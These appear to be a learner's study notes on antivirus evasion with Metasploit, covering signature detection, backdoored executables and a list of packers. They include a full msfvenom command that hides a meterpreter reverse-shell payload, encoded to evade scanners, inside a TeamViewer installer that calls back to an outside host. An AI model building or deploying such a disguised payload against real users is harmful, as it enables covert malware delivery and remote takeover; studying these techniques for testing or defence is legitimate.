we can also be sure that `AV software` developers are looking at msfconsole modules and capabilities to add the resulting code and files to their `signature` database, 
resulting in most if not all of the default payloads being immediately shut down by AV software nowadays
-> [[archiving - AV bypass]]

things to be aware by tipical security measures
-> [[exploit code]]

---
Executable files

but ... we are in lucky msfvenom allows us to use some pre-set templates for `executable files`, 
inject our payload into them (no pun intended), and use any executable as a platform from which we can launch our attack
`hiding` the payload `shellcode` deep within the legitimate code of the actual product
this generates what is called a `backdoored executable`

snippet embed payload 
```
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```
-k flag: trigger the continuation of the normal execution of the launched application while pulling the payload in a separate thread 

---
packers

the term `Packer` refers to the result of an `executable compression` process where the payload is packed together with an executable program and with the decompression code in one single file
allowing for yet another layer of protection against file scanning mechanisms on target hosts
change the file structure of a backdoored executable and encrypt the underlying process structure

packer software list:
	UPX packer
	Alternate EXE Packer
	MEW
	The Enigma Protector
	ExeStealth
	Themida
	MPRESS
	Morphine

article about packers - https://jon.oberheide.org/files/woot09-polypack.pdf







